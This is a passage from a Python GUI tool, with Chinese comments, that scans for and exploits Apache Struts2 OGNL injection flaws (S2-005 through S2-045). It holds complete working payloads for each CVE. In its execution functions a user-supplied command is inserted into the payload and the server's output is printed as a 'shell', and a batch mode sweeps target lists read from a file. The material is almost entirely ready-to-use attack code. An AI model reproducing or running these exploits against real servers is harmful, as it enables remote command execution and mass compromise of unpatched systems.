                if 'S2-005' in response.text and response.status_code == 200:  # 返回包如果出现S2-005和200响应码即表示存在漏洞
                    s5 = 1
                    print("[+] 存在S2-005漏洞")
                    print("[+] S2-005————[CVE-2010-1870]————可执行shell|CMD|dir", '\n')
                else:
                    s5 = 0
                    print("[-] 目标不存在S2-005漏洞...", '\n')
            except Exception as out:
                s5 = 0
                print("检测S2-005超时..")
                print("超时原因: ", out)

            try:
                response = requests.get(url=url + '?' + poc['s2-008'], headers=headers, timeout=timeout)
                if 'S2-008' in response.text and response.status_code == 200:  # 返回包如果出现S2-008和200响应码即表示存在漏洞
                    s8 = 1
                    print("[+] 存在S2-008漏洞")
                    print("[+] S2-008————[CVE-2012-0392]————可执行shell|CMD|dir", '\n')
                else:
                    s8 = 0
                    print("[-] 目标不存在S2-008漏洞...", '\n')
            except Exception as out:
                s8 = 0
                print("检测S2-008超时..")
                print("超时原因: ", out)

            try:
                response = requests.get(url=url + '?' + poc['s2-009'], headers=headers, timeout=timeout)
                if 'S2-009' in response.text and response.status_code == 200:  # 返回包如果出现S2-009和200响应码即表示存在漏洞
                    s9 = 1
                    print("[+] 存在S2-009漏洞")
                    print("[+] S2-009————[CVE-2011-3923]————可执行shell|CMD|dir", '\n')
                else:
                    s9 = 0
                    print("[-] 目标不存在S2-009漏洞...", '\n')
            except Exception as out:
                s9 = 0
                print("检测S2-009超时..")
                print("超时原因: ", out)

            try:
                response = requests.get(url=url + '?' + poc['s2-016'], headers=headers, timeout=timeout)
                if 'S2-016' in response.text and response.status_code == 200:  # 返回包如果出现S2-016和200响应码即表示存在漏洞
                    s16 = 1
                    print("[+] 存在S2-016漏洞")
                    print("[+] S2-016————[CVE-2013-2251]————可执行shell|CMD|dir", '\n')
                else:
                    s16 = 0
                    print("[-] 目标不存在S2-016漏洞...", '\n')
            except Exception as out:
                s16 = 0
                print("检测S2-016超时..")
                print("超时原因: ", out)

            try:
                response = requests.get(url=url + '?' + poc['s2-019'], headers=headers, timeout=timeout)
                if 'S2-019' in response.text and response.status_code == 200:  # 返回包如果出现S2-019和200响应码即表示存在漏洞
                    s19 = 1
                    print("[+] 存在S2-019漏洞")
                    print("[+] S2-019————[CVE-2013-4316]————可执行shell|CMD|dir", '\n')
                else:
                    s19 = 0
                    print("[-] 目标不存在S2-019漏洞...", '\n')
            except Exception as out:
                s19 = 0
                print("检测S2-019超时..")
                print("超时原因: ", out)

            try:
                response = requests.get(url=url + '?' + poc['s2-032'], headers=headers, timeout=timeout)
                if 'S2-032' in response.text and response.status_code == 200:  # 返回包如果出现S2-032和200响应码即表示存在漏洞
                    s32 = 1
                    print("[+] 存在S2-032漏洞")
                    print("[+] S2-032————[CVE-2016-3081]————可执行shell|CMD|dir", '\n')
                else:
                    s32 = 0
                    print("[-] 目标不存在S2-032漏洞...", '\n')
            except Exception as out:
                s32 = 0
                print("检测S2-032超时..")
                print("超时原因: ", out)

            try:
                response = requests.get(url=url, headers=s2_045poc, timeout=timeout)
                if 'S2-045' in response.text and response.status_code == 200:  # 返回包如果出现S2-045和200响应码即表示存在漏洞
                    s45 = 1
                    print("[+] 存在S2-045漏洞")
                    print("[+] S2-045————[CVE-2017-5638]————可执行shell|CMD|dir", '\n')
                else:
                    s45 = 0
                    print("[-] 目标不存在S2-045漏洞...", '\n')
            except Exception as out:
                s45 = 0
                print("检测S2-045超时..")
                print("超时原因: ", out)

            print("==========================检测结束=============================")
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)

        try:
            res = s5+s8+s9+s16+s19+s32+s45
            if res > 0:
                QMessageBox.information(self, "检测结果", "存在漏洞", QMessageBox.Yes)
            else:
                QMessageBox.information(self, "检测结果", "不存在漏洞", QMessageBox.No)
        except Exception as out:
            print(out)

        return





# ------------------------------------------------
# 执行页面设置

    def show_zhixing(self):
        self.stackedWidget.setCurrentIndex(1)
        sys.stdout = WrittingStr_3(textBrowserWritten_3=self.ly_outputWritten)
        sys.stderr = WrittingStr_3(textBrowserWritten_3=self.ly_outputWritten)

    def ly_outputWritten(self, text):
        cursor = self.textBrowser_3.textCursor()
        cursor.insertText(text)
        self.textBrowser_3.setTextCursor(cursor)
        self.textBrowser_3.ensureCursorVisible()
        QtWidgets.QApplication.processEvents()

    def ly_clear(self):
        self.textBrowser_3.clear()

    def ly_cmd(self):
        global cmd
        self.cmd = self.lineEdit_6.text()



    def ly_exp(self):
        global expurl
        self.expurl = self.lineEdit_5.text()


    def ly_outfile(self):
        try:
            Outprinttext = self.textBrowser_2.toPlainText()
            outprint = str(Outprinttext)
            filewindow = win32ui.CreateFileDialog(1)  # 1表示打开文件对话框
            filewindow.DoModal()
            file = filewindow.GetPathName()  # 获取选择的文件名称
            file = open(file, 'a')
            file.write('{}'.format(outprint))
            print("\n[+] 导入成功，保存在项目根目录的text文件")
            file.close()
            QMessageBox.information(self, "导出信息", "导出成功", QMessageBox.Yes)
        except Exception as out:
            QMessageBox.warning(self, "导出信息", "导出失败", QMessageBox.No)





    def ly_option(self,text):
        self.pushButton_8.setCheckable(True)      #一开始
        self.pushButton_8.toggle()                #toggle()切换按钮状态
        # ComboBox的选项，对应使用哪种poc函数
            # 先断开pushButton的连接，初始化pushButton,再通过text匹配对应poc
        if text == "S2-005":
            self.pushButton_8.disconnect()
            self.pushButton_8.clicked.connect(self.s2_005exp)
        elif text == "S2-008":
            self.pushButton_8.disconnect()
            self.pushButton_8.clicked.connect(self.s2_008exp)
        elif text == "S2-009":
            self.pushButton_8.disconnect()
            self.pushButton_8.clicked.connect(self.s2_009exp)
        elif text == "S2-016":
            self.pushButton_8.disconnect()
            self.pushButton_8.clicked.connect(self.s2_016exp)
        elif text == "S2-019":
            self.pushButton_8.disconnect()
            self.pushButton_8.clicked.connect(self.s2_019exp)
        elif text == "S2-032":
            self.pushButton_8.disconnect()
            self.pushButton_8.clicked.connect(self.s2_032exp)
        else:
            self.pushButton_8.disconnect()
            self.pushButton_8.clicked.connect(self.s2_045exp)

    def s2_005exp(self):
        url = self.expurl
        cmd = self.cmd
        import http.client
        http.client.HTTPConnection._http_vsn = 10
        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'  # 使用http1.0版本，用作S2-005的poc回显



        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'  # POST提交数据
        }

        timeout = 3

        s2_005 = r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'" + cmd + r"\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))"

        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            print('\n')
            try:
                response = requests.post(url=url, headers=headers, data=s2_005, timeout=timeout)
                if response.status_code == 200:  # 返回包如果出现200响应码即表示存在漏洞
                    print("shell> ",response.text)
                else:
                    print("[-] 某种原因出错了...", '\n')
            except Exception as out:
                print("检测S2-005超时..")
                print("超时原因: ", out)
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)

    def s2_008exp(self):
        url = self.expurl
        cmd = self.cmd
        urlcode = parse.quote(cmd)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
        }

        timeout = 3

        s2_008 = "debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27" + urlcode + "%27%29.getInputStream%28%29%29)"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            print('\n')
            try:
                response = requests.get(url=url + '?' + s2_008, headers=headers, timeout=timeout)
                if response.status_code == 200:  # 返回包如果出现200响应码即表示存在漏洞
                    print("shell> ",response.text)
                else:
                    print("[-] 某种原因出错了...", '\n')
            except Exception as out:
                print("检测S2-008超时..")
                print("超时原因: ", out)
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)


    def s2_009exp(self):
        url = self.expurl
        cmd = self.cmd
        urlcode = parse.quote(cmd)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
        }

        timeout = 3

        s2_009 = "age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22"+ urlcode + r"%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            print('\n')
            try:
                response = requests.get(url=url + '?' + s2_009, headers=headers, timeout=timeout)
                if response.status_code == 200:  # 返回包如果出现200响应码即表示存在漏洞
                    print("shell> ",response.text)
                else:
                    print("[-] 某种原因出错了...", '\n')
            except Exception as out:
                print("检测S2-009超时..")
                print("超时原因: ", out)
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)


    def s2_016exp(self):
        url = self.expurl
        cmd = self.cmd
        urlcode = parse.quote(cmd)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        }

        timeout = 3

        s2_016 = "redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22" + urlcode + "%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            print('\n')
            try:
                response = requests.get(url=url + '?' + s2_016, headers=headers, timeout=timeout)
                if response.status_code == 200:  # 返回包如果出现200响应码即表示存在漏洞
                    print("shell> ",response.text)
                else:
                    print("[-] 某种原因出错了...", '\n')
            except Exception as out:
                print("检测S2-016超时..")
                print("超时原因: ", out)
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)


    def s2_019exp(self):
        url = self.expurl
        cmd = self.cmd
        urlcode = parse.quote(cmd)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        }

        timeout = 3

        s2_019 = "debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22" + urlcode + "%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            print('\n')
            try:
                response = requests.get(url=url + '?' + s2_019, headers=headers, timeout=timeout)
                if response.status_code == 200:  # 返回包如果出现200响应码即表示存在漏洞
                    print("shell> ",response.text)
                else:
                    print("[-] 某种原因出错了...", '\n')
            except Exception as out:
                print("检测S2-019超时..")
                print("超时原因: ", out)
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)


    def s2_032exp(self):
        url = self.expurl
        cmd = self.cmd
        urlcode = parse.quote(cmd)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        }

        timeout = 3

        s2_032 = "method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&cmd=" + urlcode + "&dd=%20&d=____A&encoding=UTF-8"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):

            print('\n')
            try:
                response = requests.get(url=url + '?' + s2_032, headers=headers, timeout=timeout)
                if response.status_code == 200:  # 返回包如果出现200响应码即表示存在漏洞
                    print("shell> ",response.text)
                else:
                    print("[-] 某种原因出错了...", '\n')
            except Exception as out:
                print("检测S2-032超时..")
                print("超时原因: ", out)
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)

    def s2_045exp(self):
        url = self.expurl
        cmd = self.cmd
        urlcode = parse.quote(cmd)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        }

        timeout = 3

        s2_045 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        }
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):

            print('\n')
            try:
                response = requests.get(url=url, headers=s2_045, timeout=timeout)
                if response.status_code == 200:  # 返回包如果出现200响应码即表示存在漏洞
                    print("shell> ",response.text)
                else:
                    print("[-] 某种原因出错了...", '\n')
            except Exception as out:
                print("检测S2-045超时..")
                print("超时原因: ", out)
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)

#--------------------------------------

    def show_piliang(self):
        self.stackedWidget.setCurrentIndex(2)
        sys.stdout = WrittingStr_2(textBrowserWritten_2=self.pl_outputWritten)
        sys.stderr = WrittingStr_2(textBrowserWritten_2=self.pl_outputWritten)

    def pl_outputWritten(self, text):
        cursor = self.textBrowser_2.textCursor()
        cursor.insertText(text)
        self.textBrowser_2.setTextCursor(cursor)
        self.textBrowser_2.ensureCursorVisible()
        QtWidgets.QApplication.processEvents()

    def pl_openfile(self,pl_timeout):
        try:
            filewindow = win32ui.CreateFileDialog(1)  # 1表示打开文件对话框
            filewindow.DoModal()
            file = filewindow.GetPathName()  # 获取选择的文件名称
            if len(file) != 0 :
                QMessageBox.information(self, "导入信息", "导入成功", QMessageBox.Yes)
                self.lineEdit_7.setText(file)
            else:
                QMessageBox.warning(self, "导入信息", "导入失败", QMessageBox.No)
        except:
            pass


    def pl_timeout(self):
        global pl_timeout
        self.pl_timeout = self.lineEdit_9.text()


    def pl_path(self):
        global path
        self.path = self.lineEdit_7.text()

    def pl_clear(self):
        self.textBrowser_2.clear()

    def pl_outfile(self):
        try:
            Outprinttext = self.textBrowser_2.toPlainText()
            outprint = str(Outprinttext)
            filewindow = win32ui.CreateFileDialog(1)  # 1表示打开文件对话框
            filewindow.DoModal()
            file = filewindow.GetPathName()  # 获取选择的文件名称
            file = open(file,'a')
            file.write('{}'.format(outprint))
            print("\n[+] 导入成功，保存在项目根目录的text文件")
            file.close()
            QMessageBox.information(self, "导出信息", "导出成功", QMessageBox.Yes)
        except Exception as out:
            QMessageBox.warning(self, "导出信息", "导出失败", QMessageBox.No)


    def pl_batch(self,file):
        self.textBrowser_2.clear()
        path = self.path
        timeout = self.pl_timeout
        timeout = int(timeout)
        with open(path, 'r') as f:
            Struts2_targets = f.readlines()
        for target in Struts2_targets:
            try:
                target = target.split('\n')[0]
            except:
                pass


            if not(timeout):
                QMessageBox.warning(self, "批量检测信息", "检测是否输入timeout值", QMessageBox.No)
                return
            else:

                url = target
                s5 = 0
                s8 = 0
                s9 = 0
                s16 = 0
                s19 = 0
                s32 = 0
                s45 = 0
                res = s5+s8+s9+s16+s19+s32+s45

                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
                }

                s2_045poc = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
                    "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo S2-045').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
                }


                poc = {
                    "s2-005":'''('%5C43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('%5C43context[%5C'xwork.MethodAccessor.denyMethodExecution%5C']%5C75false')(b))&('%5C43c')(('%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET')(c))&(g)(('%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('%5C43xman.getWriter().print(%22S2-005%22)')(d))&(i95)(('%5C43xman.getWriter().println(%5C43req.getRealPath(%22\%22))')(d))&(i99)(('%5C43xman.getWriter().close()')(d))''',
                    "s2-008":'''debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20S2-008%27%29.getInputStream%28%29%29)''',
                    "s2-009":'''(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22echo%20S2-009%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]''',
                    "s2-016":'''redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22echo%20S2-016%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D''',
                    "s2-019":'''debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22echo%20S2-019%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()''',
                    "s2-032":'''method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&cmd=echo%20S2-032&dd=%20&d=____A&encoding=UTF-8'''
                }

                try:
                    response = requests.get(url=url, headers=headers, data=poc['s2-005'], timeout=timeout)
                    if 'S2-005' in response.text and response.status_code == 200:  # 返回包如果出现S2-005和200响应码即表示存在漏洞
                        s5 = 1
                    else:
                        s5 = 0
                except Exception as out:
                    s5 = 0
                    pass

                try:
                    response = requests.get(url=url + '?' + poc['s2-008'], headers=headers, timeout=timeout)
                    if 'S2-008' in response.text and response.status_code == 200:  # 返回包如果出现S2-008和200响应码即表示存在漏洞
                        s8 = 1
                    else:
                        s8 = 0
                except Exception as out:
                    s8 = 0
                    pass

                try:
                    response = requests.get(url=url + '?' + poc['s2-009'], headers=headers, timeout=timeout)
                    if 'S2-009' in response.text and response.status_code == 200:  # 返回包如果出现S2-009和200响应码即表示存在漏洞
                        s9 = 1
                    else:
                        s9 = 0
                except Exception as out:
                    s9 = 0
